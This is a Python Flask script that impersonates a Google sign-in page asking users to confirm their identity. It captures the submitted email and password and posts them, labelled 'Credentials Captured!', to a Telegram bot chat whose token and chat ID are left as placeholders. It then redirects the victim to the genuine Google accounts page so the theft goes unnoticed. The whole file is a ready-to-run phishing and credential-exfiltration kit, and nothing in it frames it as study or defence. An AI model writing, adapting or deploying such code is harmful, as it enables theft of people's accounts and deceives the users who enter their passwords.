from flask import Flask, request, redirect, render_template_string
import requests

app = Flask(__name__)

# CONFIG
TG_TOKEN = "כאן_שמים_טוקן_בוט"
CHAT_ID = "כאן_שמים_איידי_פרטי"

HTML = '''
<html>
<body style="font-family: sans-serif; text-align: center; padding-top: 50px;">
    <div style="display: inline-block; border: 1px solid #ccc; padding: 40px; border-radius: 10px; box-shadow: 0px 0px 10px #eee;">
        <h2 style="color: #1a73e8;">Google</h2>
        <p>Confirm your identity to continue</p>
        <form method="POST">
            <input type="text" name="u" placeholder="Email" required style="width: 100%; padding: 10px; margin-bottom: 10px;"><br>
            <input type="password" name="p" placeholder="Password" required style="width: 100%; padding: 10px; margin-bottom: 10px;"><br>
            <input type="submit" value="Next" style="background: #1a73e8; color: white; border: none; padding: 10px 30px; border-radius: 5px; cursor: pointer;">
        </form>
    </div>
</body>
</html>
'''

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        u = request.form.get('u')
        p = request.form.get('p')
        msg = f"📩 **Credentials Captured!**\n👤 **User:** `{u}`\n🔑 **Pass:** `{p}`"
        requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage", data={'chat_id': CHAT_ID, 'text': msg, 'parse_mode': 'Markdown'})
        return redirect("https://accounts.google.com")
    return render_template_string(HTML)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080)
